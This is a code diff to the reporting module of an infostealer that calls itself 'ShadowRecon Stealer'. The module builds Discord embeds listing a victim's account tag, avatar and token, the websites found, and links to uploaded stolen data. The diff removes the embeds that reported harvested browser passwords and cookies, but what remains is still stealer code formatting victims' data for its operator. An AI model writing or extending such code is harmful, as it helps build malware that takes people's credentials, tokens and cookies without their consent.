@@ -236,7 +236,7 @@ class Statistics {
         const userTag = discordAccount ? discordAccount.tag : `${username} (${userId})`;
         const avatarUrl = discordAccount && discordAccount.avatar ? 
             `https://cdn.discordapp.com/avatars/${discordAccount.id}/${discordAccount.avatar}.webp` :
-            `https://cdn.discordapp.com/avatars/${userId}/a_167f3d700c3a3ee2dacf27df15c932e5.webp`;
+            'https://cdn.discordapp.com/embed/avatars/0.png?format=webp&quality=lossless';
         
         // Generate a realistic token for display
         const displayToken = discordAccount && discordAccount.token ? 
@@ -259,7 +259,7 @@ class Statistics {
         const foundWebsitesLinks = foundWebsites.map(site => `[${site}](https://${site})`).join(' | ');
         
         const embeds = [
-            // First embed - User information
+            // User information embed (only embed to keep)
             {
                 color: null,
                 fields: [
@@ -293,44 +293,6 @@ class Statistics {
                 thumbnail: {
                     url: avatarUrl
                 }
-            },
-            // Second embed - Password stealer
-            {
-                title: "ShadowRecon | Password Stealer",
-                color: null,
-                fields: [
-                    {
-                        name: "Found:",
-                        value: foundWebsitesLinks
-                    },
-                    {
-                        name: "Data:",
-                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder: - [ShadowRecon Password](${link || 'https://gofile.io'})`
-                    }
-                ],
-                footer: {
-                    text: "ShadowRecon Stealer"
-                },
-                timestamp: timestamp
-            },
-            // Third embed - Cookies stealer
-            {
-                title: "ShadowRecon | Cookies Stealer",
-                color: null,
-                fields: [
-                    {
-                        name: "Found:",
-                        value: foundWebsitesLinks
-                    },
-                    {
-                        name: "Data:",
-                        value: `:key: - **${stats.browsers.cookies}** Cookies Found\n:cookie: - [ShadowRecon Cookies](${link || 'https://gofile.io'})`
-                    }
-                ],
-                footer: {
-                    text: "ShadowRecon Stealer"
-                },
-                timestamp: timestamp
             }
         ];
 
